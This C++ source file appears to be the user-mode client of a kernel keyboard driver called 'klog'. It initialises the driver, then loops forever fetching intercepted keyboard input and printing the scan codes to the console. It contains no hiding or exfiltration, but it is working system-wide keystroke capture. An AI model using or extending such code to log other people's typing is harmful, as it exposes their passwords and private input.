#include "klog_driver/public.h"

#include <basetyps.h>
#include <stdlib.h>
#include <wtypes.h>
#include <initguid.h>
#include <stdio.h>
#include <string.h>
#include <conio.h>
#include <ntddkbd.h>

#pragma warning(disable:4201)

#include <setupapi.h>
#include <winioctl.h>

#pragma warning(default:4201)

#include <iostream>

int main(int argc, const char* argv)
{   
    KEYBOARD_INPUT_DATA inpData[KEYBOARD_INP_BUFFER_SIZE] = {0};

    HDEVINFO                            hardwareDeviceInfo;
    SP_DEVICE_INTERFACE_DATA            deviceInterfaceData;
    PSP_DEVICE_INTERFACE_DETAIL_DATA    deviceInterfaceDetailData = NULL;
    ULONG                               predictedLength = 0;
    ULONG                               requiredLength = 0, bytes = 0;
    ULONG                               i = 0;
    KEYBOARD_ATTRIBUTES                 kbdattrib;

    HANDLE device = CreateFile(
        DRIVER_SYMBOLIC_LINK,
        GENERIC_READ | GENERIC_WRITE,// Доступ к чтению/записи
        0,                        // Совместное использование (не требуется)
        NULL,                    // Атрибуты безопасности
        OPEN_EXISTING,           // Открыть существующее устройство
        FILE_ATTRIBUTE_NORMAL,   // Обычные атрибуты
        NULL                     // Без шаблона
    );

    if (device == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open driver via symlink. Error code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        return 1;
    }

    HANDLE inputDataAddedEvent = OpenEvent(SYNCHRONIZE, FALSE, L"KeyboardInputDataAddedEvent");
    if (!inputDataAddedEvent) {
        std::cerr << "Failed to open KeyboardInputDataAddedEvent. Status code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        CloseHandle(device);
        return 1;
    }

    if (!DeviceIoControl(device, IOCTL_KLOG_INIT, NULL, 0,
                         &inpData, sizeof(inpData), &bytes, NULL)) {
        std::cerr << "Initialization of klog failed with status code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        CloseHandle(device);
        return 1;
    }

    while (true) {
        DWORD waitResult = WaitForSingleObject(inputDataAddedEvent, INFINITE);

        if (waitResult == WAIT_OBJECT_0) {
            if (!DeviceIoControl(device, IOCTL_KLOG_GET_INPUT_DATA, NULL, 0,
                                 &inpData, sizeof(inpData), &bytes, NULL)) {
                std::cerr << "Retrieve Keyboard Input Data request failed with status code 0x"
                    << std::uppercase << std::hex << GetLastError() << "\n";
                CloseHandle(device);
                return 1;
            }
            ResetEvent(inputDataAddedEvent);
        }
        else {
            std::cerr << "WaitForSingleObject failed with status code 0x"
                << std::uppercase << std::hex << GetLastError() << "\n";
            break;
        }

        if (bytes > 0) {
            std::cout << "Pressed keys:\n";
            for (ULONG k = 0; k < (bytes / sizeof(inpData[0])); ++k) {
                std::cout << inpData[k].MakeCode << " ";
            }
            std::cout << "\n";
        }
    }

    CloseHandle(device);

    return 0;
}
